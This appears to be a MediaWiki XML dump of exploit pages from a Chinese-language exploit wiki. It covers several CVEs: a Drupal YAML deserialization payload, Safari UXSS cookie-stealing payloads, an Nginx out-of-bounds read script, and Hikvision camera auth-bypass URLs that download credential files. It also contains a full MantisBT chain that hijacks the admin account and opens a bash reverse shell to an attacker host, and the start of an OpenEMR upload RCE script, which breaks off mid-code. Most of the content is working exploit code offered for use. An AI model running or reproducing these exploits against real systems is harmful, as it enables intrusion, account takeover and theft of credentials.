    setup_sandbox();
#if SMEP_SMAP_BYPASS
    disable_smep_smap();
#endif
    get_root();
    check_root();
    while (true) {
        sleep(100);
    }
    return 0;
}
&lt;/pre&gt;</text>
      <sha1>geuxw32zfgmou0gbxh9doxmzqes1an3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-6920 Drupal YAML 反序列化代碼執行漏洞</title>
    <ns>0</ns>
    <id>856</id>
    <revision>
      <id>1116</id>
      <timestamp>2021-04-07T11:35:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 登錄管理員賬戶，訪問以下URL： &lt;/translate&gt; &lt;pre&gt; http://127.0.0.1/admin/config/development..."</comment>
      <origin>1116</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="689" sha1="hpjlk2pizceyxkra2ekllvt0ou36p13" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
登錄管理員賬戶，訪問以下URL：
&lt;/translate&gt;
&lt;pre&gt;
http://127.0.0.1/admin/config/development/configuration/single/import
&lt;/pre&gt;

&lt;translate&gt;
&lt;code&gt;Configuration type&lt;/code&gt;選擇為&lt;/code&gt;Simple configuration&lt;/code&gt;

&lt;code&gt;Configuration name&lt;/code&gt;可以隨便填寫，在&lt;code&gt;Paste your configuration here&lt;/code&gt;中寫入poc:
&lt;/translate&gt;
&lt;pre&gt;
!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"
&lt;/pre&gt;

&lt;translate&gt;
點擊左下角的Import按鈕便可以觸發漏洞。
&lt;/translate&gt;</text>
      <sha1>hpjlk2pizceyxkra2ekllvt0ou36p13</sha1>
    </revision>
    <revision>
      <id>1117</id>
      <parentid>1116</parentid>
      <timestamp>2021-04-07T11:35:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1117</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="744" sha1="e2zhxu3zxov6gs2ef1skfehro4x92ri" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
登錄管理員賬戶，訪問以下URL：
&lt;/translate&gt;
&lt;pre&gt;
http://127.0.0.1/admin/config/development/configuration/single/import
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
&lt;code&gt;Configuration type&lt;/code&gt;選擇為&lt;/code&gt;Simple configuration&lt;/code&gt;

&lt;!--T:4--&gt;
&lt;code&gt;Configuration name&lt;/code&gt;可以隨便填寫，在&lt;code&gt;Paste your configuration here&lt;/code&gt;中寫入poc:
&lt;/translate&gt;
&lt;pre&gt;
!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:5--&gt;
點擊左下角的Import按鈕便可以觸發漏洞。
&lt;/translate&gt;</text>
      <sha1>e2zhxu3zxov6gs2ef1skfehro4x92ri</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-6920 Drupal YAML 反序列化代碼執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3017</id>
    <revision>
      <id>3518</id>
      <timestamp>2021-05-26T13:34:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "點擊左下角的Import按鈕便可以觸發漏洞。"</comment>
      <origin>3518</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="589" sha1="qmrx69m4navq7r98wbnezojoh9lvlno" xml:space="preserve">&lt;languages   /&gt;

==漏洞利用==

登錄管理員賬戶，訪問以下URL：
&lt;pre&gt;
http://127.0.0.1/admin/config/development/configuration/single/import
&lt;/pre&gt;

&lt;code&gt;Configuration type&lt;/code&gt;選擇為&lt;/code&gt;Simple configuration&lt;/code&gt;

&lt;code&gt;Configuration name&lt;/code&gt;可以隨便填寫，在&lt;code&gt;Paste your configuration here&lt;/code&gt;中寫入poc:
&lt;pre&gt;
!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"
&lt;/pre&gt;

點擊左下角的Import按鈕便可以觸發漏洞。</text>
      <sha1>qmrx69m4navq7r98wbnezojoh9lvlno</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-7089 WebkitWebkit（Safari）XSS</title>
    <ns>0</ns>
    <id>545</id>
    <revision>
      <id>751</id>
      <timestamp>2021-03-29T14:21:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; &lt;!-- # CVE-2017-7089   **Impact**: Processing maliciously crafted web content may lead to universal cross site scripting   **Description**: A logic issue existed..."</comment>
      <origin>751</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1064" sha1="7gam8muc09iv8wnxx0nak4il0c06aqf" xml:space="preserve">==XSS==
&lt;pre&gt;
&lt;!--
# CVE-2017-7089
 
**Impact**: Processing maliciously crafted web content may lead to universal cross site scripting
 
**Description**: A logic issue existed in the handling of the parent-tab. This issue was addressed with improved state management.
 
#### Safari 10
 
##### Local SOP bypass
 
```html
&lt;script&gt; function Pew(){var doc=open('parent-tab://apple.com');doc.document.body.innerHTML='&lt;img src=q onerror=alert(document.cookie)&gt;';}&lt;/script&gt;&lt;button onclick=Pew();&gt;Click me!&lt;/button&gt;
```
##### Exploit by Frans Rosén
```html
data:text/html,&lt;script&gt;function y(){x=open('parent-tab://google.com','_top'),x.document.body.innerHTML='&lt;img/src=""onerror="alert(document.cookie)"&gt;'};setTimeout(y,100)&lt;/script&gt;
```
--&gt;
 
&lt;body onload=document.getElementById('pew').click()&gt;
&lt;a id='pew' href='data:text/html,&lt;script&gt;function y(){x=open(&amp;#x27;parent-tab://apple.com&amp;#x27;,&amp;#x27;_top&amp;#x27;),x.document.body.innerHTML=&amp;#x27;&lt;img/src=""onerror=alert(document.domain);alert(document.cookie);&gt;&amp;#x27;};setTimeout(y,100)&lt;/script&gt;'&gt;hello&lt;/a&gt;
&lt;/body&gt; 
&lt;/pre&gt;</text>
      <sha1>7gam8muc09iv8wnxx0nak4il0c06aqf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-7494 Samba遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1564</id>
    <revision>
      <id>1950</id>
      <timestamp>2021-04-30T06:53:16Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with " === EXP ===  [https://github.com/joxeankoret/CVE-2017-7494 CVE-2017-7494]  === Info ===  [https://www.anquanke.com/post/id/86181 Samba远程代码执行漏洞(CVE-2017-7494)-..."</comment>
      <origin>1950</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="196" sha1="96cau6mn84k4lwxwa3lm3vlg8w9nf23" xml:space="preserve">
=== EXP ===

[https://github.com/joxeankoret/CVE-2017-7494 CVE-2017-7494]

=== Info ===

[https://www.anquanke.com/post/id/86181 Samba远程代码执行漏洞(CVE-2017-7494)-SambaCry分析报告]</text>
      <sha1>96cau6mn84k4lwxwa3lm3vlg8w9nf23</sha1>
    </revision>
    <revision>
      <id>1951</id>
      <parentid>1950</parentid>
      <timestamp>2021-04-30T06:55:24Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>/* EXP */</comment>
      <origin>1951</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="277" sha1="12ki6e2usm4ckwnf3w159x2nkzeipto" xml:space="preserve">
=== EXP ===

[https://github.com/joxeankoret/CVE-2017-7494 joxeankoret-CVE-2017-7494]
[https://github.com/opsxcq/exploit-CVE-2017-7494 opsxcq-CVE-2017-7494]
=== Info ===
[https://www.anquanke.com/post/id/86181 Samba远程代码执行漏洞(CVE-2017-7494)-SambaCry分析报告]</text>
      <sha1>12ki6e2usm4ckwnf3w159x2nkzeipto</sha1>
    </revision>
    <revision>
      <id>1952</id>
      <parentid>1951</parentid>
      <timestamp>2021-04-30T06:55:48Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>/* EXP */</comment>
      <origin>1952</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="277" sha1="srdt5clvj6ebu3qj3oxp3g72j7q3kls" xml:space="preserve">
=== EXP ===
[https://github.com/joxeankoret/CVE-2017-7494 joxeankoret-CVE-2017-7494]

[https://github.com/opsxcq/exploit-CVE-2017-7494 opsxcq-CVE-2017-7494]
=== Info ===
[https://www.anquanke.com/post/id/86181 Samba远程代码执行漏洞(CVE-2017-7494)-SambaCry分析报告]</text>
      <sha1>srdt5clvj6ebu3qj3oxp3g72j7q3kls</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-7529 Nginx越界讀取緩存漏洞</title>
    <ns>0</ns>
    <id>437</id>
    <revision>
      <id>632</id>
      <timestamp>2021-03-23T02:29:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Nginx version 0.5.6 - 1.13.2 &lt;/pre&gt;   ==POC== &lt;pre&gt; #!/usr/bin/env python import sys import requests  if len(sys...."</comment>
      <origin>632</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="908" sha1="h9qjrnv79x79sqz1uwwxlvvhsbdwssn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Nginx version 0.5.6 - 1.13.2
&lt;/pre&gt;


==POC==
&lt;pre&gt;
#!/usr/bin/env python
import sys
import requests

if len(sys.argv) &lt; 2:
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
    sys.exit()

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}
offset = 605
url = sys.argv[1]
file_len = len(requests.get(url, headers=headers).content)
n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

r = requests.get(url, headers=headers)
&lt;/pre&gt;


&lt;translate&gt;
==參考==
&lt;/translate&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529.html</text>
      <sha1>h9qjrnv79x79sqz1uwwxlvvhsbdwssn</sha1>
    </revision>
    <revision>
      <id>633</id>
      <parentid>632</parentid>
      <timestamp>2021-03-23T02:30:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>633</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="930" sha1="euodowa8uho5evac5mxhv1or7ceo9sb" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Nginx version 0.5.6 - 1.13.2
&lt;/pre&gt;


==POC==
&lt;pre&gt;
#!/usr/bin/env python
import sys
import requests

if len(sys.argv) &lt; 2:
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
    sys.exit()

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}
offset = 605
url = sys.argv[1]
file_len = len(requests.get(url, headers=headers).content)
n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

r = requests.get(url, headers=headers)
&lt;/pre&gt;


&lt;translate&gt;
==參考== &lt;!--T:2--&gt;
&lt;/translate&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529.html</text>
      <sha1>euodowa8uho5evac5mxhv1or7ceo9sb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-7529 Nginx越界讀取緩存漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3081</id>
    <revision>
      <id>3582</id>
      <timestamp>2021-05-26T14:52:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本=="</comment>
      <origin>3582</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="858" sha1="g9iuvddp9p6h9v6yrdjzxryxop74u5g" xml:space="preserve">&lt;languages /&gt;
==影響版本==
&lt;pre&gt;
Nginx version 0.5.6 - 1.13.2
&lt;/pre&gt;


==POC==
&lt;pre&gt;
#!/usr/bin/env python
import sys
import requests

if len(sys.argv) &lt; 2:
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
    sys.exit()

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}
offset = 605
url = sys.argv[1]
file_len = len(requests.get(url, headers=headers).content)
n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

r = requests.get(url, headers=headers)
&lt;/pre&gt;


==參考==
http://wiki.peiqi.tech/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529.html</text>
      <sha1>g9iuvddp9p6h9v6yrdjzxryxop74u5g</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-7615 MantisBT 任意密碼重置漏洞</title>
    <ns>0</ns>
    <id>2753</id>
    <revision>
      <id>3252</id>
      <timestamp>2021-05-25T08:55:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; # Exploit Title: Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated) # Date: 2020-09-17 # Vulnerability Discovery: hyp3rlinx, permanull # Exploit..."</comment>
      <origin>3252</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7996" sha1="gzkjnqsrbttrply0nziea9049alah6w" xml:space="preserve">==POC==
&lt;pre&gt;
# Exploit Title: Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
# Date: 2020-09-17
# Vulnerability Discovery: hyp3rlinx, permanull
# Exploit Author: Nikolas Geiselman
# Vendor Homepage: https://mantisbt.org/
# Software Link: https://mantisbt.org/download.php
# Version: 1.3.0/2.3.0
# Tested on: Ubuntu 16.04/19.10/20.04
# CVE : CVE-2017-7615, CVE-2019-15715
# References:
# https://mantisbt.org/bugs/view.php?id=26091
# https://www.exploit-db.com/exploits/41890
'''
This exploit chains together two CVE's to achieve unauthenticated remote code execution.
The first portion of this exploit resets the Administrator password (CVE-2017-7615) discovered by John Page a.k.a hyp3rlinx, this portion was modified from the original https://www.exploit-db.com/exploits/41890.
The second portion of this exploit takes advantage of a command injection vulnerability (CVE-2019-15715) discovered by 'permanull' (see references).
Usage:
Set netcat listener on port 4444
Send exploit with "python exploit.py"
Example output:
kali@kali:~/Desktop$ python exploit.py
Successfully hijacked account!
Successfully logged in!
Triggering reverse shell
Cleaning up
Deleting the dot_tool config.
Deleting the relationship_graph_enable config.
Successfully cleaned up
kali@kali:~/Desktop$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.116.135] from (UNKNOWN) [192.168.116.151] 43978
bash: cannot set terminal process group (835): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/mantisbt-2.3.0$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
'''
import requests
from urllib import quote_plus
from base64 import b64encode
from re import split
class exploit():
    def __init__(self):
        self.s = requests.Session()
        self.headers = dict()  # Initialize the headers dictionary
        self.RHOST = "192.168.116.151"  # Victim IP
        self.RPORT = "80"  # Victim port
        self.LHOST = "192.168.116.135"  # Attacker IP
        self.LPORT = "4444"  # Attacker Port
        self.verify_user_id = "1"  # User id for the target account
        self.realname = "administrator"  # Username to hijack
        self.passwd = "password"  # New password after account hijack
        self.mantisLoc = "/mantisbt-2.3.0"  # Location of mantis in URL
        self.ReverseShell = "echo " + b64encode(
            "bash -i &gt;&amp; /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0&gt;&amp;1") + " | base64 -d | /bin/bash"  # Reverse shell payload
    def reset_login(self):
        # Request # 1: Grab the account update token
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/verify.php?id=' + self.verify_user_id + '&amp;confirm_hash='
        r = self.s.get(url=url, headers=self.headers)
        if r.status_code == 404:
            print "ERROR: Unable to access password reset page"
            exit()
        account_update_token = r.text.split('name="account_update_token" value=')[1].split('"')[1]
        # Request # 2: Reset the account password
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/account_update.php'
        data = "account_update_token=" + account_update_token + "&amp;password=" + self.passwd + "&amp;verify_user_id=" + self.verify_user_id + "&amp;realname=" + self.realname + "&amp;password_confirm=" + self.passwd
        self.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        r = self.s.post(url=url, headers=self.headers, data=data)
        if r.status_code == 200:
            print "Successfully hijacked account!"
    def login(self):
        data = "return=index.php&amp;username=" + self.realname + "&amp;password=" + self.passwd + "&amp;secure_session=on"
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
        r = self.s.post(url=url, headers=self.headers, data=data)
        if "login_page.php" not in r.url:
            print "Successfully logged in!"
    def CreateConfigOption(self, option, value):
        # Get adm_config_set_token
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_report.php'
        r = self.s.get(url=url, headers=self.headers)
        adm_config_set_token = r.text.split('name="adm_config_set_token" value=')[1].split('"')[1]
        # Create config
        data = "adm_config_set_token=" + adm_config_set_token + "&amp;user_id=0&amp;original_user_id=0&amp;project_id=0&amp;original_project_id=0&amp;config_option=" + option + "&amp;original_config_option=&amp;type=0&amp;value=" + quote_plus(
            value) + "&amp;action=create&amp;config_set=Create+Configuration+Option"
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_set.php'
        r = self.s.post(url=url, headers=self.headers, data=data)
    def TriggerExploit(self):
        print "Triggering reverse shell"
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/workflow_graph_img.php'
        try:
            r = self.s.get(url=url, headers=self.headers, timeout=3)
        except:
            pass
    def Cleanup(self):
        # Delete the config settings that were created to send the reverse shell
        print "Cleaning up"
        cleaned_up = False
        cleanup = requests.Session()
        CleanupHeaders = dict()
        CleanupHeaders.update({'Content-Type': 'application/x-www-form-urlencoded'})
        data = "return=index.php&amp;username=" + self.realname + "&amp;password=" + self.passwd + "&amp;secure_session=on"
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
        r = cleanup.post(url=url, headers=CleanupHeaders, data=data)
        ConfigsToCleanup = ['dot_tool', 'relationship_graph_enable']
        for config in ConfigsToCleanup:
            # Get adm_config_delete_token
            url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php"
            r = cleanup.get(url=url, headers=self.headers)
            test = split('&lt;!-- Repeated Info Rows --&gt;', r.text)
            # First element of the response list is garbage, delete it
            del test[0]
            cleanup_dict = dict()
            for i in range(len(test)):
                if config in test[i]:
                    cleanup_dict.update({'config_option': config})
                    cleanup_dict.update({'adm_config_delete_token':
                                             test[i].split('name="adm_config_delete_token" value=')[1].split('"')[1]})
                    cleanup_dict.update({'user_id': test[i].split('name="user_id" value=')[1].split('"')[1]})
                    cleanup_dict.update({'project_id': test[i].split('name="project_id" value=')[1].split('"')[1]})
            # Delete the config
            print "Deleting the " + config + " config."
            url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_delete.php"
            data = "adm_config_delete_token=" + cleanup_dict['adm_config_delete_token'] + "&amp;user_id=" + cleanup_dict[
                'user_id'] + "&amp;project_id=" + cleanup_dict['project_id'] + "&amp;config_option=" + cleanup_dict[
                       'config_option'] + "&amp;_confirmed=1"
            r = cleanup.post(url=url, headers=CleanupHeaders, data=data)
            # Confirm if actually cleaned up
            r = cleanup.get(url="http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php",
                            headers=CleanupHeaders, verify=False)
            if config in r.text:
                cleaned_up = False
            else:
                cleaned_up = True
        if cleaned_up == True:
            print "Successfully cleaned up"
        else:
            print "Unable to clean up configs"
exploit = exploit()
exploit.reset_login()
exploit.login()
exploit.CreateConfigOption(option="relationship_graph_enable", value="1")
exploit.CreateConfigOption(option="dot_tool", value=exploit.ReverseShell + ';')
exploit.TriggerExploit()
exploit.Cleanup()
&lt;/pre&gt;</text>
      <sha1>gzkjnqsrbttrply0nziea9049alah6w</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-7921 海康威視(Hikvision) 敏感信息泄漏漏洞</title>
    <ns>0</ns>
    <id>1156</id>
    <revision>
      <id>1445</id>
      <timestamp>2021-04-10T05:06:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; http://&lt;camera.ip&gt;/Security/users?auth=YWRtaW46MTEK &lt;/pre&gt;  下載攝像頭配置賬號密碼文件: &lt;pre&gt; http://&lt;camera.ip&gt;/System/configurationFile?auth=YWRta..."</comment>
      <origin>1445</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="189" sha1="jmicx3fmp1jckj98a3mnx2eua2vpn8b" xml:space="preserve">==EXP==
&lt;pre&gt;
http://&lt;camera.ip&gt;/Security/users?auth=YWRtaW46MTEK
&lt;/pre&gt;

下載攝像頭配置賬號密碼文件:
&lt;pre&gt;
http://&lt;camera.ip&gt;/System/configurationFile?auth=YWRtaW46MTEK
&lt;/pre&gt;</text>
      <sha1>jmicx3fmp1jckj98a3mnx2eua2vpn8b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-9380 OpenEMR 5.0.0遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4128</id>
    <revision>
      <id>4756</id>
      <timestamp>2021-06-11T09:40:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: OpenEMR 5.0.0 - Remote Code Execution (Authenticated) # Date 10.06.2021 # Exploit Author: Ron Jost (Hacker5preme) # Vendor Homepage: https://www..."</comment>
      <origin>4756</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="28790" sha1="n46nxhulws5rysxp3eu7lthhpg6xu65" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: OpenEMR 5.0.0 - Remote Code Execution (Authenticated)
# Date 10.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://sourceforge.net/projects/openemr/files/OpenEMR%20Current/5.0.0/openemr-5.0.0.zip/download
# Version: 5.0.0
# Tested on: Windows 10
# CVE: CVE-2017-9380
# Documentation: https://github.com/Hacker5preme/Exploits#cve-2017-9380-exploit

'''
Description:
The OpenEMR application allows users from all roles to upload files. However, the application does not whitelist only
certain type of files (e.g. PDF, JPG, PNG, DOCX, etc). At the contary, any type of files can be uploaded to the
filesystem via the application. While OpenEMR recommends during the installation to restrict access to the repository
hosting uploaded files, unfortunately, such recommendations are too often ignored by users and can result in full
compromise of the web server and its data.
'''


'''
Import required modules:
'''
import argparse
import requests
import string
import random


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Exploit for CVE-2017-9380')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.PATH
username = args.USERNAME
password = args.PASSWORD


'''
Exploit:
'''
# Authentication preparation:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&amp;site=default'
auth_chek_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/login/login.php?site=default'
response = session.get(auth_chek_url)

# Header (auth):
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Referer': auth_chek_url,
    'Upgrade-Insecure-Requests': '1',
}

# Body (auth):
body = {
    'new_login_session_management': '1',
    'authProvider': 'Default',
    'authUser': username,
    'clearPass': password,
    'languageChoice': '1'
}

# Authenticate:
print('')
print('[+] Authentication')
auth = session.post(auth_url,headers=header, data=body)

# Create random patient name:
letters_up = string.ascii_uppercase
letters_down = string.ascii_lowercase
first_name = ''.join(random.choice(letters_up)) + ''.join(random.choice(letters_down) for i in range(10))
surname = ''.join(random.choice(letters_up)) + ''.join(random.choice(letters_down) for i in range(7))
print('')
print('[+] Creating patient name randomly:')
print('    [*] First Name: ' + first_name)
print('    [*] Surname: ' + surname)

# Registration preparation:
url_reg = 'http://' + target_ip + ':' + target_port + openemr_path + 'interface/new/new_comprehensive_save.php'

# Header (registration):
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Referer': 'http://' + target_ip + ':' + target_port + openemr_path + 'interface/new/new.php',
    'Upgrade-Insecure-Requests': '1'
}
body = {
    'form_cb_1': '1',
    'form_title': 'Mr.',
    'form_fname': first_name,
    'form_mname': '',
    'form_lname': surname,
    'form_pubpid': '',
    'form_DOB': '2021-05-04',
    'form_sex': 'Male',
    'form_ss': '',
    'form_drivers_license': '',
    'form_status': '',
    'form_genericname1': '',
    'form_genericval1': '',
    'form_genericname2': '',
    'form_genericval2': '',
    'form_billing_note': '',
    'form_street': '',
    'form_city': '',
    'form_state': '',
    'form_postal_code': '',
    'form_county': '',
    'form_country_code': '',
    'form_mothersname': '',
    'form_contact_relationship': '',
    'form_phone_contact': '',
    'form_phone_home': '',
    'form_phone_biz': '',
    'form_phone_cell': '',
    'form_email': '',
    'form_email_direct': '',
    'form_providerID': '',
    'form_ref_providerID': '',
    'form_pharmacy_id': '0',
    'form_hipaa_notice': '',
    'form_hipaa_voice': '',
    'form_hipaa_message': '',
    'form_hipaa_mail': '',
    'form_hipaa_allowsms': '',
    'form_hipaa_allowemail': '',
    'form_allow_imm_reg_use': '',
    'form_allow_imm_info_share': '',
    'form_allow_health_info_ex': '',
    'form_allow_patient_portal': '',
    'form_care_team': '',
    'form_cmsportal_login': '',
    'form_imm_reg_status': '',
    'form_imm_reg_stat_effdate': '',
    'form_publicity_code': '',
    'form_publ_code_eff_date': '',
    'form_protect_indicator': '',
    'form_prot_indi_effdate': '',
    'form_industry': '',
    'form_occupation': '',
    'form_em_name': '',
    'form_em_street': '',
    'form_em_city': '',
    'form_em_state': '',
    'form_em_postal_code': '',
    'form_em_country': '',
    'form_language': '',
    'form_ethnicity': '',
    'form_family_size': '',
    'form_financial_review': '',
    'form_monthly_income': '',
    'form_homeless': '',
    'form_interpretter': '',
    'form_migrantseasonal': '',
    'form_referral_source': '',
    'form_vfc': '',
    'form_religion': '',
    'form_deceased_date': '',
    'form_deceased_reason': '',
    'form_guardiansname': '',
    'form_guardianrelationship': '',
